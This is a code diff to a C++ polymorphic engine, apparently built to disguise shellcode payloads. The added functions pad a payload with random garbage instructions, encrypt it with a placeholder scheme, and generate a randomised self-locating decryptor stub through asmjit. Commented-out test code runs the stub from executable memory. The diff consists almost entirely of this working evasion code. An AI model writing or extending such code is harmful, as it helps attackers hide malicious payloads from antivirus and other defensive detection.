@@ -829,6 +829,29 @@ void ShoggothPolyEngine::AppendEncryptedData(){
 
 // *****************************************************
 
+void ShoggothPolyEngine::DebugBuffer(PBYTE buffer, int bufferSize) {
+    FILE* hFile = fopen("garbagetest.bin", "wb");
+
+    if (hFile != NULL)
+    {
+        fwrite(buffer, bufferSize, 1, hFile);
+        fclose(hFile);
+    }
+}
+
+
+PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
+    Func functionPtr;
+    PBYTE returnValue;
+    endOffset = asmjitAssembler->offset();
+    codeSize = endOffset - startOffset;
+    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
+    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
+    // memcpy(returnValue, functionPtr, codeSize);
+    this->ResetAsmjit();
+    return (PBYTE)functionPtr;
+}
+
 void ShoggothPolyEngine::MixupArrayOutputRegs(SPE_OUTPUT_REGS* registerArr, WORD size) {
     SPE_OUTPUT_REGS temp;
     for (int i = size - 1; i > 0; i--) {
@@ -852,17 +875,6 @@ void ShoggothPolyEngine::MixupArrayRegs(x86::Reg* registerArr, WORD size) {
     }
 }
 
-PBYTE ShoggothPolyEngine::AssembleCodeHolder(int &codeSize) {
-    Func functionPtr;
-    PBYTE returnValue;
-    endOffset = asmjitAssembler->offset();
-    codeSize = endOffset - startOffset;
-    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
-    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
-    // memcpy(returnValue, functionPtr, codeSize);
-    this->ResetAsmjit();
-    return (PBYTE)functionPtr;
-}
 
 
 void ShoggothPolyEngine::StartAsmjit() {
@@ -903,37 +915,155 @@ x86::Gp ShoggothPolyEngine::GetRandomGeneralPurposeRegister() {
 }
 
 
-void ShoggothPolyEngine::StartEncoding(PBYTE input, uint64_t inputSize) {
+void ShoggothPolyEngine::StartEncoding(PBYTE payload, uint64_t payloadSize) {
+    int firstGarbageSize = 0;
+    int firstGarbageWithPayloadSize = 0;
+    int firstDecryptorSize = 0;
+    int firstDecryptorAndEncryptedPayloadSize = 0;
+    PBYTE firstGarbage = NULL;
+    PBYTE firstGarbageWithPayload = NULL;
+    PBYTE firstEncryptedStup = NULL;
+    PBYTE firstDecryptor = NULL;
+    PBYTE firstDecryptorAndEncryptedPayload = NULL;
     // Start codeholder and assembler
     this->StartAsmjit();
     // Push all registers first
     this->PushAllRegisters();
     
     // Get Some Garbage Instructions
-    this->GenerateRandomGarbage();
-
-}
-
-void ShoggothPolyEngine::DebugCurrentCodeBuffer() {
-    Func functionPtr;
-    asmjitAssembler->nop();
-    endOffset = asmjitAssembler->offset();
-    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
-    printf("Code Size: %d", endOffset - startOffset);
-    FILE* hFile = fopen("garbagetest.bin", "wb");
-
-    if (hFile != NULL)
-    {
-        fwrite(functionPtr, endOffset - startOffset, 1, hFile);
-        fclose(hFile);
-    }
+    firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
+    firstGarbageWithPayloadSize = payloadSize + firstGarbageSize;
+    firstGarbageWithPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstGarbageWithPayloadSize);
+    memcpy(firstGarbageWithPayload, firstGarbage, firstGarbageSize);
+    memcpy(firstGarbageWithPayload + firstGarbageSize, payload, payloadSize);
     
-    this->ResetAsmjit();
-    this->StartAsmjit();
-    functionPtr();
+    //Func fun2 = (Func)VirtualAlloc(NULL,firstGarbageWithPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //memcpy(fun2, firstGarbageWithPayload, firstGarbageWithPayloadSize);
+    //fun2();
+    firstEncryptedStup = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize);
+    //firstEncryptionStup = this->FirstEncryption(payload, payloadSize);
+    firstDecryptor = this->FirstDecryptor(firstGarbageWithPayloadSize, firstDecryptorSize);
+    this->DebugBuffer(firstDecryptor, firstDecryptorSize);
+    firstDecryptorAndEncryptedPayloadSize = firstDecryptorSize + firstGarbageWithPayloadSize;
+    firstDecryptorAndEncryptedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, firstDecryptorAndEncryptedPayloadSize);
+    memcpy(firstDecryptorAndEncryptedPayload, firstDecryptor, firstDecryptorSize);
+    memcpy(firstDecryptorAndEncryptedPayload + firstDecryptorSize, firstEncryptedStup, firstGarbageWithPayloadSize);
+    // TEST
+    //Func fun = (Func)VirtualAlloc(NULL, firstDecryptorSize  + firstGarbageWithPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //memcpy(fun, firstDecryptor, firstDecryptorSize);
+    //memcpy((PBYTE) fun + firstDecryptorSize, firstEncryptedStup, firstGarbageWithPayloadSize);
+    //fun();
+    this->PopAllRegisters();
+    HeapFree(GetProcessHeap(), NULL, firstGarbage);
+    HeapFree(GetProcessHeap(), NULL, firstGarbageWithPayload);
+    HeapFree(GetProcessHeap(), NULL, firstEncryptedStup);
+    HeapFree(GetProcessHeap(), NULL, firstDecryptor);
+    HeapFree(GetProcessHeap(), NULL, firstDecryptorAndEncryptedPayload);
 }
 
-PBYTE ShoggothPolyEngine::GenerateRandomGarbage() {
+/*
+* TODO REPLACE WITH A GOOD ALGORITHM
+    call randomLabel
+    randomLabel:
+    pop rax (letssay)
+    mov rbx, payloadSize
+    add rax,sizepatch
+    loop:
+    test rbx,rbx
+    jz data
+    sub [rax],-1
+    inc rax
+    dec rbx
+    jmp loop
+    data:
+
+    asmjitAssembler->add(regSrc, imm(272727));
+
+    // save the position of the previous DWORD
+    // so that we can later update it to contain
+    // the length of the remainder of the function
+    // Bi oncesi
+    posSrcPtr = asmjitAssembler->offset() - sizeof(DWORD);
+}
+
+ size_t current_position = asmjitAssembler->offset();
+
+    DWORD dwAdjustSize = static_cast<DWORD>(asmjitAssembler->offset() - posDeltaOffset);
+
+    asmjitAssembler->setOffset(posSrcPtr);
+    // correct the instruction which sets up
+    // a pointer to the encrypted data block
+    // at the end of the decryption function
+    //
+    // this pointer is loaded into the regSrc
+    // register, and must be updated by the
+    // size of the remainder of the function
+    // after the delta_offset label --> Labelden oncesi + labeldan sonrasi
+    asmjitAssembler->dd(dwAdjustSize + dwUnusedCodeSize);
+    asmjitAssembler->setOffset(current_position);
+
+*/
+
+PBYTE ShoggothPolyEngine::FirstDecryptor(int payloadSize, int& firstDecryptorSize) {
+    // Dummy Decryptor
+    char* randomStringForCall = GenerateRandomString();
+    char* randomStringForLoop = GenerateRandomString();
+    char* randomStringForData = GenerateRandomString();
+    DWORD adjustSize = 0;
+    uint64_t patchAddress = NULL;
+    uint64_t callOffset = NULL;
+    uint64_t currentOffset = NULL;
+    Label randomLabelForCall = asmjitAssembler->newNamedLabel(randomStringForCall, 16);
+    Label randomLabelForLoop = asmjitAssembler->newNamedLabel(randomStringForLoop, 16);
+    Label randomLabelForData = asmjitAssembler->newNamedLabel(randomStringForData, 16);
+    x86::Gp randomGeneralPurposeRegisterSize = this->GetRandomGeneralPurposeRegister();
+    x86::Gp randomGeneralPurposeRegisterAddress = this->GetRandomGeneralPurposeRegister();
+    while (randomGeneralPurposeRegisterAddress.id() == randomGeneralPurposeRegisterSize.id()) {
+        randomGeneralPurposeRegisterAddress = this->GetRandomGeneralPurposeRegister();
+    }
+    asmjitAssembler->call(randomLabelForCall);
+    asmjitAssembler->bind(randomLabelForCall);
+    callOffset = asmjitAssembler->offset();
+    asmjitAssembler->pop(randomGeneralPurposeRegisterAddress);
+    asmjitAssembler->mov(randomGeneralPurposeRegisterSize, imm(payloadSize));
+    asmjitAssembler->add(randomGeneralPurposeRegisterAddress, imm(1234));
+    patchAddress = asmjitAssembler->offset() - sizeof(DWORD);
+    asmjitAssembler->bind(randomLabelForLoop);
+    asmjitAssembler->test(randomGeneralPurposeRegisterSize, randomGeneralPurposeRegisterSize);
+    asmjitAssembler->jz(randomLabelForData);
+    asmjitAssembler->sub(x86::byte_ptr(randomGeneralPurposeRegisterAddress), 1);
+    asmjitAssembler->inc(randomGeneralPurposeRegisterAddress);
+    asmjitAssembler->dec(randomGeneralPurposeRegisterSize);
+    asmjitAssembler->jmp(randomLabelForLoop);
+    asmjitAssembler->bind(randomLabelForData);
+    currentOffset = asmjitAssembler->offset();
+    adjustSize = currentOffset - callOffset;
+    asmjitAssembler->setOffset(patchAddress);
+    asmjitAssembler->dd(adjustSize);
+    asmjitAssembler->setOffset(currentOffset);
+    //asmjitAssembler->nop();
+
+    PBYTE returnValue = this->AssembleCodeHolder(firstDecryptorSize);
+    //this->DebugBuffer(returnValue, firstDecryptorSize);
+    HeapFree(GetProcessHeap(), NULL, randomStringForCall);
+    HeapFree(GetProcessHeap(), NULL, randomStringForLoop);
+    HeapFree(GetProcessHeap(), NULL, randomStringForData);
+    return returnValue;
+}
+
+
+PBYTE ShoggothPolyEngine::FirstEncryption(PBYTE plainPayload, int payloadSize) {
+    // Dummy Encryption
+    PBYTE copyPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
+    memcpy(copyPayload, plainPayload, payloadSize);
+    for (int i = 0; i < payloadSize; i++) {
+        copyPayload[i] += 1;
+    }
+    return copyPayload;
+}
+
+
+PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
     PBYTE garbageInstructions;
     PBYTE jmpOverRandomByte;
     Func garbageInstTest;
@@ -962,6 +1092,7 @@ PBYTE ShoggothPolyEngine::GenerateRandomGarbage() {
         memcpy(returnValue, jmpOverRandomByte, codeSizeJmpOver);
         memcpy(returnValue + codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
     }
+    garbageSize = codeSizeJmpOver + codeSizeGarbage;
     return returnValue;
 }
 
@@ -1337,6 +1468,9 @@ void ShoggothPolyEngine::RandomUnsafeGarbage() {
     x86::Gp randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
     x86::Gp randomGeneralPurposeRegisterSource = this->GetRandomGeneralPurposeRegister();
     int randomIndexForSelect = RandomizeInRange(1, 16);
+    while (randomGeneralPurposeRegisterDest.id() == randomGeneralPurposeRegisterSource.id()) {
+        randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
+    }
     asmjitAssembler->push(randomGeneralPurposeRegisterDest);
     BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
     //TODO : ADD memory examples, 
